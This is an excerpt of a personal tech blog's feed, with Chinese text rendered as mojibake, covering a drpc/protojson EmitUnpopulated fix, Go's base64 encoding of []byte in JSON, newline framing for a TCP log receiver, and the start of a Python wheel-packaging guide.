    <link href="/2023/04/26/drpc%E7%9A%84%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7%E7%9A%84%E7%AE%80%E5%8D%95%E6%94%B9%E9%80%A0/"/>
    <url>/2023/04/26/drpc%E7%9A%84%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7%E7%9A%84%E7%AE%80%E5%8D%95%E6%94%B9%E9%80%A0/</url>
    
    <content type="html"><![CDATA[<h4 id="å‰æ–‡"><a href="#å‰æ–‡" class="headerlink" title="å‰æ–‡"></a>å‰æ–‡</h4><p>ç”±äºé¡¹ç›®ç»„ç”¨äº†ä¸€ä¸ªè½»é‡çš„golang rpcæ¡†æ¶â€”â€”drpcï¼Œå‡ºç°äº†httpæ¥å£ï¼Œjsonå­—æ®µomitemptyæ— æ³•é…ç½®ï¼Œå¯¼è‡´restfulæ¥å£ï¼Œå­—æ®µå€¼æ˜¯å¯¹åº”ç±»å‹çš„é›¶å€¼æ—¶ï¼Œæ¥å£ä¸æ˜¯è¿”å›é›¶å€¼ï¼Œè€Œæ˜¯ç›´æ¥ä¸è¿”å›è¯¥å­—æ®µã€‚å¦‚æ¥å£é¢„æœŸè¿”å›æ˜¯ï¼š</p><pre><code class="hljs plain">&#123;  &quot;code&quot;: 0,  &quot;message&quot;: &quot;hello world&quot;,  &quot;data&quot;: []&#125;</code></pre><p>å®é™…drpcçš„restfulæœåŠ¡è¿”å›çš„æ˜¯ï¼š</p><pre><code class="hljs plain">&#123;  &quot;message&quot;: &quot;hello world&quot;&#125;</code></pre><p>å› æ­¤ç ”ç©¶äº†ä¸‹drpcçš„æºç ï¼Œå¹¶è¿›è¡Œäº†ç›¸åº”æ”¹é€ ï¼Œè§£å†³è¿™ä¸€é—®é¢˜</p><h4 id="å®šä½"><a href="#å®šä½" class="headerlink" title="å®šä½"></a>å®šä½</h4><p>é€šè¿‡è§‚å¯Ÿpbæ–‡ä»¶ï¼Œå‘ç°drpcä½¿ç”¨çš„json marshalå·¥å…·ä¸æ˜¯å†…ç½®çš„encording/json åŒ…ï¼Œè€Œæ˜¯ protojson åŒ…<br><img src="/img/drpc2.jpeg" srcset="/img/loading.gif" alt="image"><br>å†çœ‹protojson çš„MarshalOptionsæºç ï¼Œå°±å¾ˆæ¸…æ™°äº†ï¼ŒEmitUnpopulated å°±æ˜¯ç±»ä¼¼json tagçš„omitempty</p><pre><code class="hljs Go"><span class="hljs-comment">// MarshalOptions is a configurable JSON format marshaler.</span><span class="hljs-keyword">type</span> MarshalOptions <span class="hljs-keyword">struct</span> &#123;pragma.NoUnkeyedLiterals<span class="hljs-comment">// Multiline specifies whether the marshaler should format the output in</span><span class="hljs-comment">// indented-form with every textual element on a new line.</span><span class="hljs-comment">// If Indent is an empty string, then an arbitrary indent is chosen.</span>Multiline <span class="hljs-keyword">bool</span><span class="hljs-comment">// Indent specifies the set of indentation characters to use in a multiline</span><span class="hljs-comment">// formatted output such that every entry is preceded by Indent and</span><span class="hljs-comment">// terminated by a newline. If non-empty, then Multiline is treated as true.</span><span class="hljs-comment">// Indent can only be composed of space or tab characters.</span>Indent <span class="hljs-keyword">string</span><span class="hljs-comment">// AllowPartial allows messages that have missing required fields to marshal</span><span class="hljs-comment">// without returning an error. If AllowPartial is false (the default),</span><span class="hljs-comment">// Marshal will return error if there are any missing required fields.</span>AllowPartial <span class="hljs-keyword">bool</span><span class="hljs-comment">// UseProtoNames uses proto field name instead of lowerCamelCase name in JSON</span><span class="hljs-comment">// field names.</span>UseProtoNames <span class="hljs-keyword">bool</span><span class="hljs-comment">// UseEnumNumbers emits enum values as numbers.</span>UseEnumNumbers <span class="hljs-keyword">bool</span><span class="hljs-comment">// EmitUnpopulated specifies whether to emit unpopulated fields. It does not</span><span class="hljs-comment">// emit unpopulated oneof fields or unpopulated extension fields.</span><span class="hljs-comment">// The JSON value emitted for unpopulated fields are as follows:</span><span class="hljs-comment">//  â•”â•â•â•â•â•â•â•â•¤â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—</span><span class="hljs-comment">//  â•‘ JSON  â”‚ Protobuf field             â•‘</span><span class="hljs-comment">//  â• â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£</span><span class="hljs-comment">//  â•‘ false â”‚ proto3 boolean fields      â•‘</span><span class="hljs-comment">//  â•‘ 0     â”‚ proto3 numeric fields      â•‘</span><span class="hljs-comment">//  â•‘ ""    â”‚ proto3 string/bytes fields â•‘</span><span class="hljs-comment">//  â•‘ null  â”‚ proto2 scalar fields       â•‘</span><span class="hljs-comment">//  â•‘ null  â”‚ message fields             â•‘</span><span class="hljs-comment">//  â•‘ []    â”‚ list fields                â•‘</span><span class="hljs-comment">//  â•‘ &#123;&#125;    â”‚ map fields                 â•‘</span><span class="hljs-comment">//  â•šâ•â•â•â•â•â•â•â•§â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•</span>EmitUnpopulated <span class="hljs-keyword">bool</span><span class="hljs-comment">// Resolver is used for looking up types when expanding google.protobuf.Any</span><span class="hljs-comment">// messages. If nil, this defaults to using protoregistry.GlobalTypes.</span>Resolver <span class="hljs-keyword">interface</span> &#123;protoregistry.ExtensionTypeResolverprotoregistry.MessageTypeResolver&#125;&#125;</code></pre><p>æ¥ä¸‹æ¥çš„å·¥ä½œå°±æ˜¯è®©drpcç”Ÿæˆçš„pbä»£ç ä¸­ï¼Œprotojson.Marshal æ–¹æ³•ä½¿ç”¨è¿™ä¸ªé…ç½®ã€‚æ‰€ä»¥å†å›åˆ°drpcæºç ï¼Œæ‰¾åˆ°ç”Ÿæˆè¿™ä¸€æ®µä»£ç çš„ä½ç½®ï¼š<br><img src="/img/drpc3.jpeg" srcset="/img/loading.gif" alt="image"></p><p>å¹¶åšå¦‚ä¸‹ä¿®æ”¹ï¼š<br><img src="/img/drpc4.png" srcset="/img/loading.gif" alt="image"></p><p>å‰©ä¸‹çš„å·¥ä½œå°±æ˜¯æŠŠprotoc-gen-go-drpcå·¥å…·é‡æ–°ç¼–è¯‘å³å¯ï¼Œæœ€ç»ˆç”Ÿæˆçš„pbæ–‡ä»¶ï¼Œprotocjson.Marshalæ–¹æ³•ä¹ŸæˆåŠŸä½¿ç”¨äº†MarshalOptionsé…ç½®ï¼š<br><img src="/img/drpc5.png" srcset="/img/loading.gif" alt="image"></p><p>é™„ä¸Šç”Ÿæˆdrpc pbä»£ç çš„é•œåƒ</p><pre><code class="hljs plain">FROM golang:1.19-alpine3.16 as builderENV GOPROXY&#x3D;https:&#x2F;&#x2F;goproxy.cn,directWORKDIR &#x2F;srcCOPY . &#x2F;srcRUN go mod download -xRUN go build -o &#x2F;bin&#x2F;protoc-gen-go cmd&#x2F;protoc-gen-go&#x2F;main.goRUN go build -o &#x2F;bin&#x2F;protoc-gen-go-drpc main.goFROM alpine:3.16RUN apk updateRUN apk add protobufCOPY --from&#x3D;builder &#x2F;bin&#x2F;protoc-gen-go-drpc &#x2F;binCOPY --from&#x3D;builder &#x2F;bin&#x2F;protoc-gen-go &#x2F;binWORKDIR &#x2F;protobufENTRYPOINT protoc --go_out&#x3D;&#x2F;out --go-drpc_out&#x3D;&#x2F;out --proto_path&#x3D;. $(find .&#x2F; -name &#39;*.proto&#39;)# docker build -f Dockerfile -t tc&#x2F;protoc-drpc .# docker run --rm -v $(pwd)&#x2F;protobuf:&#x2F;protobuf -v $(pwd):&#x2F;out tc&#x2F;protoc-drpc</code></pre><h4 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h4><p>debugæœŸé—´ä¹Ÿå¯¹protobuf-goå·¥å…·ï¼Œåšäº†ä¿®æ”¹ï¼Œå®ç°ç”Ÿæˆçš„pbæ–‡ä»¶çš„å­—æ®µï¼Œjson tag ä¸æºå¸¦ omitemptyï¼Œå…·ä½“ä¿®æ”¹å¦‚ä¸‹ï¼š<br><img src="/img/drpc6.png" srcset="/img/loading.gif" alt="image"></p><p><img src="/img/drpc7.jpeg" srcset="/img/loading.gif" alt="image"><br>æœ€åï¼Œéå¿…è¦è¿˜æ˜¯ç”¨grpcè¿™ç§ç¤¾åŒºæ›´æ´»è·ƒçš„æ¡†æ¶å§</p>]]></content>
    
    
    <categories>
      
      <category>go</category>
      
    </categories>
    
    
    <tags>
      
      <tag>go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è®°ä¸€æ¬¡go base64ç¼–ç æ’æŸ¥</title>
    <link href="/2022/08/16/base64%E7%BC%96%E7%A0%81%E6%8E%92%E6%9F%A5/"/>
    <url>/2022/08/16/base64%E7%BC%96%E7%A0%81%E6%8E%92%E6%9F%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å¼€å‘ä¸­å¶ç„¶å‘ç°ï¼Œç»“æ„ä½“ä¸­å£°æ˜äº†[]byteç±»å‹çš„å­—æ®µï¼Œjson marshalåï¼Œ[]byteç±»å‹çš„å­—æ®µä¼šè¢«base64ç¼–ç ï¼Œä¸‹é¢é€šè¿‡ä¸€ä¸ªä¾‹å­æ¥æ‰¾æ‰¾base64ç¼–ç çš„åŸå› </p><h2 id="æ’æŸ¥è¿‡ç¨‹"><a href="#æ’æŸ¥è¿‡ç¨‹" class="headerlink" title="æ’æŸ¥è¿‡ç¨‹"></a>æ’æŸ¥è¿‡ç¨‹</h2><h3 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h3><pre><code class="hljs GO"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> (<span class="hljs-string">"encoding/json"</span><span class="hljs-string">"testing"</span>)<span class="hljs-keyword">type</span> Reply <span class="hljs-keyword">struct</span> &#123;Name    <span class="hljs-keyword">string</span>Content []<span class="hljs-keyword">byte</span>&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestJSONMarshal</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<span class="hljs-keyword">var</span> r = Reply&#123;Name:    <span class="hljs-string">"lam"</span>,Content: []<span class="hljs-keyword">byte</span>(<span class="hljs-string">"pongpong"</span>),&#125;res, _ := json.Marshal(&amp;r)t.Log(<span class="hljs-keyword">string</span>(res))&#125;</code></pre><p>è¾“å‡º</p><pre><code class="hljs plain">&#x3D;&#x3D;&#x3D; RUN   TestJSONMarshal    client_test.go:26: &#123;&quot;Name&quot;:&quot;lam&quot;,&quot;Content&quot;:&quot;cG9uZ3Bvbmc&#x3D;&quot;&#125;--- PASS: TestJSONMarshal (0.00s)PASS</code></pre><p>è·Ÿç€debugè¿›å…¥encoding/json åŒ…å†…éƒ¨ï¼Œå‘ç°æ³¨é‡Šéƒ¨åˆ†å·²ç»è¯´æ˜[]byteç±»å‹ä¼šè¢«base64ç¼–ç ï¼š</p><pre><code class="hljs plain">&#x2F;&#x2F; ...&#x2F;&#x2F; Array and slice values encode as JSON arrays, except that&#x2F;&#x2F; []byte encodes as a base64-encoded string, and a nil slice&#x2F;&#x2F; encodes as the null JSON value.&#x2F;&#x2F; ...</code></pre><p>ç»§ç»­æ ¹æ®æ–¹æ³•è°ƒç”¨é“¾æ‰¾åˆ°å…·ä½“çš„ç¼–ç ä½ç½®ï¼š</p><pre><code class="hljs plain">func (e *encodeState) marshal(v any, opts encOpts) (err error) &#123;defer func() &#123;if r :&#x3D; recover(); r !&#x3D; nil &#123;if je, ok :&#x3D; r.(jsonError); ok &#123;err &#x3D; je.error&#125; else &#123;panic(r)&#125;&#125;&#125;()e.reflectValue(reflect.ValueOf(v), opts)return nil&#125;</code></pre><pre><code class="hljs plain">func (e *encodeState) reflectValue(v reflect.Value, opts encOpts) &#123;valueEncoder(v)(e, v, opts)&#125;func valueEncoder(v reflect.Value) encoderFunc &#123;if !v.IsValid() &#123;return invalidValueEncoder&#125;return typeEncoder(v.Type())&#125;</code></pre><pre><code class="hljs plain">func typeEncoder(t reflect.Type) encoderFunc &#123;        &#x2F;&#x2F; ...&#x2F;&#x2F; Compute the real encoder and replace the indirect func with it.f &#x3D; newTypeEncoder(t, true)wg.Done()encoderCache.Store(t, f)return f&#125;</code></pre><pre><code class="hljs plain">func newTypeEncoder(t reflect.Type, allowAddr bool) encoderFunc &#123;        &#x2F;&#x2F; ...switch t.Kind() &#123;        &#x2F;&#x2F; ...case reflect.Slice:return newSliceEncoder(t)        &#x2F;&#x2F; ...default:return unsupportedTypeEncoder&#125;&#125;</code></pre><pre><code class="hljs plain">func newSliceEncoder(t reflect.Type) encoderFunc &#123;&#x2F;&#x2F; Byte slices get special treatment; arrays don&#39;t.if t.Elem().Kind() &#x3D;&#x3D; reflect.Uint8 &#123;p :&#x3D; reflect.PointerTo(t.Elem())if !p.Implements(marshalerType) &amp;&amp; !p.Implements(textMarshalerType) &#123;return encodeByteSlice&#125;&#125;enc :&#x3D; sliceEncoder&#123;newArrayEncoder(t)&#125;return enc.encode&#125;</code></pre><p>è¯¥æ–¹æ³•ä¼šæ ¹æ®sliceçš„é•¿åº¦é€‰æ‹©æ•ˆç‡æ›´é«˜çš„å­—ç¬¦ä¸²æ‹¼æ¥æ–¹å¼</p><pre><code class="hljs plain">func encodeByteSlice(e *encodeState, v reflect.Value, _ encOpts) &#123;if v.IsNil() &#123;e.WriteString(&quot;null&quot;)return&#125;s :&#x3D; v.Bytes()e.WriteByte(&#39;&quot;&#39;)encodedLen :&#x3D; base64.StdEncoding.EncodedLen(len(s))if encodedLen &lt;&#x3D; len(e.scratch) &#123;&#x2F;&#x2F; If the encoded bytes fit in e.scratch, avoid an extra&#x2F;&#x2F; allocation and use the cheaper Encoding.Encode.dst :&#x3D; e.scratch[:encodedLen]base64.StdEncoding.Encode(dst, s)e.Write(dst)&#125; else if encodedLen &lt;&#x3D; 1024 &#123;&#x2F;&#x2F; The encoded bytes are short enough to allocate for, and&#x2F;&#x2F; Encoding.Encode is still cheaper.dst :&#x3D; make([]byte, encodedLen)base64.StdEncoding.Encode(dst, s)e.Write(dst)&#125; else &#123;&#x2F;&#x2F; The encoded bytes are too long to cheaply allocate, and&#x2F;&#x2F; Encoding.Encode is no longer noticeably cheaper.enc :&#x3D; base64.NewEncoder(base64.StdEncoding, e)enc.Write(s)enc.Close()&#125;e.WriteByte(&#39;&quot;&#39;)&#125;</code></pre><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>è‡³æ­¤ï¼Œ[]byteè¢«base64ç¼–ç çš„ä»£ç å·²ç»æ‰¾ç€äº†ï¼Œæ€è€ƒäº†ä¸‹goä¹‹æ‰€ä»¥é€‰æ‹©ç¼–ç []byteï¼Œæ˜¯ä¸ºäº†é¿å…ä½¿ç”¨utf-8è¿›è¡Œç¼–ç è½¬æ¢çš„æ—¶å€™å‡ºç°éé¢„æœŸçš„å­—ç¬¦ï¼Œå¯¼è‡´â€œä¹±ç â€é—®é¢˜ï¼›ç±»ä¼¼çš„åœ¨AESåŠ å¯†ç­‰åœºæ™¯ä¸‹ï¼Œä¹Ÿä¼šé€‰æ‹©æŠŠåŠ å¯†åçš„äºŒè¿›åˆ¶æ•°ç»„ä½¿ç”¨base64æˆ–å…¶ä»–æ–¹å¼çš„ç¼–ç ä¸ºå­—ç¬¦ä¸²è¿›è¡Œä¼ è¾“å’Œå­˜å‚¨ï¼Œå¾…ä½¿ç”¨æ—¶è¿›è¡Œbase64è§£ç ï¼Œå†æ“ä½œåŸå§‹çš„[]byteæ•°æ®ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Go</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è®°ä¸€æ¬¡tcpæŠ¥æ–‡åˆ†éš”é—®é¢˜å¤„ç†</title>
    <link href="/2022/07/29/%E8%AE%B0%E4%B8%80%E6%AC%A1tcp%E6%8A%A5%E6%96%87%E5%88%86%E9%9A%94%E9%97%AE%E9%A2%98%E5%A4%84%E7%90%86/"/>
    <url>/2022/07/29/%E8%AE%B0%E4%B8%80%E6%AC%A1tcp%E6%8A%A5%E6%96%87%E5%88%86%E9%9A%94%E9%97%AE%E9%A2%98%E5%A4%84%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>è¿‘æœŸå¼€å‘äº†ä¸€ä¸ªæ”¯æŒé«˜å¹¶å‘çš„syslogæ—¥å¿—å‘é€å·¥å…·ï¼Œæ‰‹å†™äº†ä¸€ä¸ªç®€å•tcp serverä½œä¸ºæ¥æ”¶ç«¯ï¼Œåœ¨æ‰“æ—¥å¿—çš„è¿‡ç¨‹ä¸­å¶ç„¶å‘ç°äº†ç»ˆç«¯æ‰“å°çš„æ—¥å¿—æ•°æ®æœ‰äº›ä¸å®Œæ•´ï¼Œtcp serverä»£ç å¦‚ä¸‹ï¼š</p><pre><code class="hljs Go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> (<span class="hljs-string">"bufio"</span><span class="hljs-string">"fmt"</span><span class="hljs-string">"net"</span>)<span class="hljs-comment">// TCP Serverç«¯ï¼ˆæœ¬åœ°è°ƒè¯•ç”¨ï¼‰</span><span class="hljs-comment">// å¤„ç†å‡½æ•°</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">process</span><span class="hljs-params">(conn net.Conn)</span></span> &#123;<span class="hljs-keyword">defer</span> conn.Close() <span class="hljs-comment">// å…³é—­è¿æ¥</span>        reader := bufio.NewReader(conn)<span class="hljs-keyword">var</span> buf [<span class="hljs-number">128</span>]<span class="hljs-keyword">byte</span>n, err := reader.Read(buf[:]) <span class="hljs-comment">// è¯»å–æ•°æ®</span><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;fmt.Println(<span class="hljs-string">"read from client failed, err: "</span>, err)<span class="hljs-keyword">break</span>&#125;recvStr := <span class="hljs-keyword">string</span>(buf[:n])fmt.Println(<span class="hljs-string">"æ”¶åˆ°Clientç«¯å‘æ¥çš„æ•°æ®ï¼š"</span>, recvStr)<span class="hljs-comment">//conn.Write([]byte(recvStr)) // å‘é€æ•°æ®</span>&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;listen, err := net.Listen(<span class="hljs-string">"tcp"</span>, <span class="hljs-string">"0.0.0.0:3333"</span>)<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;fmt.Println(<span class="hljs-string">"Listen() failed, err: "</span>, err)<span class="hljs-keyword">return</span>&#125;<span class="hljs-keyword">for</span> &#123;conn, err := listen.Accept() <span class="hljs-comment">// ç›‘å¬å®¢æˆ·ç«¯çš„è¿æ¥è¯·æ±‚</span><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;fmt.Println(<span class="hljs-string">"Accept() failed, err: "</span>, err)<span class="hljs-keyword">continue</span>&#125;<span class="hljs-keyword">go</span> process(conn) <span class="hljs-comment">// å¯åŠ¨ä¸€ä¸ªgoroutineæ¥å¤„ç†å®¢æˆ·ç«¯çš„è¿æ¥è¯·æ±‚</span>&#125;&#125;</code></pre><p>æŒ‰é€»è¾‘æ˜¯æ¯è¡Œæ—¥å¿—ä¹‹é—´ä¼šæ¢è¡Œï¼Œä½†å®é™…è¿‡ç¨‹ä¸­ï¼Œæœ‰å‡ æ¡æ—¥å¿—ä¼šå’Œä¸Šä¸€æ¡ç²˜åœ¨ä¸€èµ·ï¼Œè€Œä¸”è¢«æˆªæ–­ï¼Œç°è±¡å¦‚ä¸‹:</p><p><img src="/img/tcp1.jpeg" srcset="/img/loading.gif" alt="image"></p><p>æ’æŸ¥åå‘ç°ï¼Œâ€œç²˜åŒ…â€œæ˜¯ç”±äºï¼Œtcpæ˜¯æµä¼ è¾“ï¼Œä¼šæœ‰ç¼“å­˜åŒºï¼Œä¸ä¸€å®šèƒ½å¤ŸåŠæ—¶æŠŠæ¶ˆæ¯å‘å‡ºå»ï¼ŒåƒNagleä¼˜åŒ–ç®—æ³•ä¼šå°†å¤šæ¬¡é—´éš”è¾ƒå°ã€æ•°æ®é‡å°çš„æ•°æ®ï¼Œåˆå¹¶æˆä¸€ä¸ªå¤§çš„æ•°æ®å—ï¼Œç„¶åè¿›è¡Œå°åŒ…æ˜¯ï¼Œè€Œbufåªè®¾ç½®æ¯æ¬¡è¯»å–äº†128å­—èŠ‚ã€‚</p><p>googleäº†ä¸€ä¸‹è§£å†³åŠæ³•ï¼š</p><ul><li>TCPæœ¬èº«æ˜¯é¢å‘æµçš„ï¼Œä½œä¸ºç½‘ç»œæœåŠ¡å™¨ï¼Œå¦‚ä½•ä»è¿™æºæºä¸æ–­æ¶Œæ¥çš„æ•°æ®æµä¸­æ‹†åˆ†å‡ºæˆ–è€…åˆå¹¶å‡ºæœ‰æ„ä¹‰çš„ä¿¡æ¯å‘¢ï¼Ÿé€šå¸¸ä¼šæœ‰ä»¥ä¸‹ä¸€äº›å¸¸ç”¨çš„æ–¹æ³•ï¼š</li><li>1ã€å‘é€ç«¯ç»™æ¯ä¸ªæ•°æ®åŒ…æ·»åŠ åŒ…é¦–éƒ¨ï¼Œé¦–éƒ¨ä¸­åº”è¯¥è‡³å°‘åŒ…å«æ•°æ®åŒ…çš„é•¿åº¦ï¼Œè¿™æ ·æ¥æ”¶ç«¯åœ¨æ¥æ”¶åˆ°æ•°æ®åï¼Œé€šè¿‡è¯»å–åŒ…é¦–éƒ¨çš„é•¿åº¦å­—æ®µï¼Œä¾¿çŸ¥é“æ¯ä¸€ä¸ªæ•°æ®åŒ…çš„å®é™…é•¿åº¦äº†ã€‚</li><li>2ã€å‘é€ç«¯å°†æ¯ä¸ªæ•°æ®åŒ…å°è£…ä¸ºå›ºå®šé•¿åº¦ï¼ˆä¸å¤Ÿçš„å¯ä»¥é€šè¿‡è¡¥0å¡«å……ï¼‰ï¼Œè¿™æ ·æ¥æ”¶ç«¯æ¯æ¬¡ä»æ¥æ”¶ç¼“å†²åŒºä¸­è¯»å–å›ºå®šé•¿åº¦çš„æ•°æ®å°±è‡ªç„¶è€Œç„¶çš„æŠŠæ¯ä¸ªæ•°æ®åŒ…æ‹†åˆ†å¼€æ¥ã€‚</li><li>3ã€å¯ä»¥åœ¨æ•°æ®åŒ…ä¹‹é—´è®¾ç½®è¾¹ç•Œï¼Œå¦‚æ·»åŠ ç‰¹æ®Šç¬¦å·ï¼Œè¿™æ ·ï¼Œæ¥æ”¶ç«¯é€šè¿‡è¿™ä¸ªè¾¹ç•Œå°±å¯ä»¥å°†ä¸åŒçš„æ•°æ®åŒ…æ‹†åˆ†å¼€ã€‚</li></ul><p>å·¥å…·å‘é€çš„æ—¥å¿—éƒ½æ˜¯ä»¥ \nç»“å°¾ï¼Œä¸”é•¿åº¦ä¸å›ºå®šï¼Œå› æ­¤é€‰æ‹©ç”¨åˆ†éš”ç¬¦åˆ‡åˆ†ï¼Œtcp server processå‡½æ•°ä¿®æ”¹å¦‚ä¸‹ï¼š</p><pre><code class="hljs Go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">process</span><span class="hljs-params">(conn net.Conn)</span></span> &#123;<span class="hljs-keyword">defer</span> conn.Close() <span class="hljs-comment">// å…³é—­è¿æ¥</span><span class="hljs-keyword">for</span> &#123;reader := bufio.NewReader(conn)<span class="hljs-keyword">for</span> &#123;data, err := reader.ReadSlice(<span class="hljs-string">'\n'</span>)<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<span class="hljs-keyword">if</span> err != io.EOF &#123;log.Println(err)&#125; <span class="hljs-keyword">else</span> &#123;fmt.Println(<span class="hljs-string">"read from client failed, err: "</span>, err)<span class="hljs-keyword">break</span>&#125;&#125;fmt.Println(<span class="hljs-string">"æ”¶åˆ°Clientç«¯å‘æ¥çš„æ•°æ®ï¼š"</span>, <span class="hljs-keyword">string</span>(data))&#125;&#125;&#125;</code></pre><p>å†æ¬¡æ¥å—æ—¥å¿—ï¼Œå°±æ²¡æœ‰æˆªæ–­å’Œæ•°æ®ç²˜é»çš„é—®é¢˜å•¦ï½<br><img src="/img/tcp2.jpeg" srcset="/img/loading.gif" alt="image"></p><p>psï¼šä½¿ç”¨æŠ“åŒ…å·¥å…·å°±å¯ä»¥å‘ç°ï¼Œåƒhttpæ˜¯ç”¨\r\nå»åšæ•°æ®çš„è¾¹ç•ŒåŒºåˆ†çš„</p><p>æœ€åï¼Œâ€œç²˜åŒ…â€çš„æ—¶å€™éƒ½æ˜¯ç²˜äº†æ—¥å¿—çš„å‰åŠéƒ¨åˆ†ï¼Œè€Œå•æ¡æ—¥å¿—çš„ååŠéƒ¨åˆ†åœ¨ä¹‹åçš„ä¼ è¾“ä¸­å°±ç¥å¥‡çš„ä¸¢å¤±äº†ï¼Œè¿™ä¸ªç›®å‰è¿˜æ²¡æ‰¾åˆ°åŸå› </p><p>ç¼–è¾‘åšä¸‹è¡¥å……ï¼Œtcpæ˜¯æµä¼ è¾“ï¼Œâ€ç²˜åŒ…â€ä¸¤ä¸ªå­—åˆ»æ„åŠ äº†å¼•å·ï¼Œæœ¬æ„æ˜¯æƒ³æŒ‡ä»£ä¸šåŠ¡æ•°æ®çš„è¾¹ç•Œå¤„ç†é—®é¢˜ï¼Œç”¨è¯ä¸å½“ï¼Œå¸Œæœ›ä¸è¯¯å¯¼å„ä½</p>]]></content>
    
    
    <categories>
      
      <category>Go</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç½‘ç»œ</tag>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pythoné¡¹ç›®æ‰“åŒ…ä¸ºwhlåŒ…</title>
    <link href="/2022/07/07/Python%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85%E4%B8%BAwhl%E5%8C%85/"/>
    <url>/2022/07/07/Python%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85%E4%B8%BAwhl%E5%8C%85/</url>
    
    <content type="html"><![CDATA[<h3 id="Pythoné¡¹ç›®æ‰“åŒ…ä¸ºwhlåŒ…"><a href="#Pythoné¡¹ç›®æ‰“åŒ…ä¸ºwhlåŒ…" class="headerlink" title="Pythoné¡¹ç›®æ‰“åŒ…ä¸ºwhlåŒ…"></a>Pythoné¡¹ç›®æ‰“åŒ…ä¸ºwhlåŒ…</h3><h4 id="1ã€è¿›å…¥è¦æ‰“åŒ…çš„é¡¹ç›®æ ¹ç›®å½•ä¸‹ï¼Œåˆ›å»ºsetup-pyï¼š"><a href="#1ã€è¿›å…¥è¦æ‰“åŒ…çš„é¡¹ç›®æ ¹ç›®å½•ä¸‹ï¼Œåˆ›å»ºsetup-pyï¼š" class="headerlink" title="1ã€è¿›å…¥è¦æ‰“åŒ…çš„é¡¹ç›®æ ¹ç›®å½•ä¸‹ï¼Œåˆ›å»ºsetup.pyï¼š"></a>1ã€è¿›å…¥è¦æ‰“åŒ…çš„é¡¹ç›®æ ¹ç›®å½•ä¸‹ï¼Œåˆ›å»ºsetup.pyï¼š</h4><pre><code class="hljs python"><span class="hljs-keyword">from</span> setuptools <span class="hljs-keyword">import</span> setup, find_packages setup(    name = <span class="hljs-string">"driver"</span>,    version = <span class="hljs-string">"0.1"</span>,    packages = find_packages(),    <span class="hljs-comment">#ç›®æ ‡æ–‡ä»¶</span>    py_modeles = <span class="hljs-string">'driver_classification.py'</span>,    <span class="hljs-comment">#excelæ–‡ä»¶</span>    data_file = <span class="hljs-string">'driver_model_data.xlsx'</span>,    include_package_data = <span class="hljs-literal">True</span>,    <span class="hljs-comment">#åŒ…å«æ‰€æœ‰.xlsxæ–‡ä»¶</span>    package_data = &#123;)</code></pre><h5 id="setupå‡½æ•°å„å‚æ•°è¯¦è§£ï¼š"><a href="#setupå‡½æ•°å„å‚æ•°è¯¦è§£ï¼š" class="headerlink" title="setupå‡½æ•°å„å‚æ•°è¯¦è§£ï¼š"></a>setupå‡½æ•°å„å‚æ•°è¯¦è§£ï¼š</h5><pre><code class="hljs plain">--name              åŒ…åç§°  --version (-V)      åŒ…ç‰ˆæœ¬  --author            ç¨‹åºçš„ä½œè€…  --author_email      ç¨‹åºçš„ä½œè€…çš„é‚®ç®±åœ°å€  --maintainer        ç»´æŠ¤è€…  --maintainer_email  ç»´æŠ¤è€…çš„é‚®ç®±åœ°å€  --url               ç¨‹åºçš„å®˜ç½‘åœ°å€  --license           ç¨‹åºçš„æˆæƒä¿¡æ¯  --description       ç¨‹åºçš„ç®€å•æè¿°  --long_description  ç¨‹åºçš„è¯¦ç»†æè¿°  --platforms         ç¨‹åºé€‚ç”¨çš„è½¯ä»¶å¹³å°åˆ—è¡¨  --classifiers       ç¨‹åºçš„æ‰€å±åˆ†ç±»åˆ—è¡¨  --keywords          ç¨‹åºçš„å…³é”®å­—åˆ—è¡¨  --packages  éœ€è¦æ‰“åŒ…çš„ç›®å½•åˆ—è¡¨  --py_modules  éœ€è¦æ‰“åŒ…çš„pythonæ–‡ä»¶åˆ—è¡¨  --download_url  ç¨‹åºçš„ä¸‹è½½åœ°å€  --cmdclass    --data_files  æ‰“åŒ…æ—¶éœ€è¦æ‰“åŒ…çš„æ•°æ®æ–‡ä»¶ï¼Œå¦‚å›¾ç‰‡ï¼Œé…ç½®æ–‡ä»¶ç­‰  --scripts  å®‰è£…æ—¶éœ€è¦æ‰§è¡Œçš„è„šæ­¥åˆ—è¡¨</code></pre><h4 